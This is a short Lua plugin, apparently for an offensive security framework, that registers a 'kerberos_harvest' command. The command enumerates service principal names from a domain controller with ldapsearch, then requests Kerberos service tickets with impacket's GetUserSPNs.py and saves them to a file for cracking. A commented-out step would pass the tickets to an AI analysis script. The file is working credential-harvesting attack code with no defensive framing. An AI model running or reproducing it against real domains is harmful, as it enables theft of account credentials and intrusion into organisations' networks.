function kerberos_harvest()
    local domain = app.params["domain"]
    local dc_ip = app.params["rhost"]
    local output_file = "/tmp/kerberos_tickets.txt"

    if not domain or not dc_ip then
        return "Error: Domain or DC IP not specified."
    end

    -- Query SPNs using ldapsearch
    local ldap_cmd = string.format("ldapsearch -H ldap://%s -x -b 'DC=%s' '(servicePrincipalName=*)' > /tmp/spns.txt", dc_ip, domain)
    print(ldap_cmd)
    os.execute(ldap_cmd)

    -- Request tickets using impacket's GetUserSPNs
    local ticket_cmd = string.format("GetUserSPNs.py -dc-ip %s %s -outputfile %s", dc_ip, domain, output_file)
    local success = os.execute(ticket_cmd)

    if not success then
        return "Error: Failed to harvest tickets."
    end

    -- Trigger AI analysis (via your Groq/DeepSeek integration)
    -- local ai_cmd = string.format("python3 ai_analyze.py --tickets %s", output_file)
    -- os.execute(ai_cmd)

    return "Kerberos tickets harvested and saved to: " .. output_file
end

register_command("kerberos_harvest", kerberos_harvest)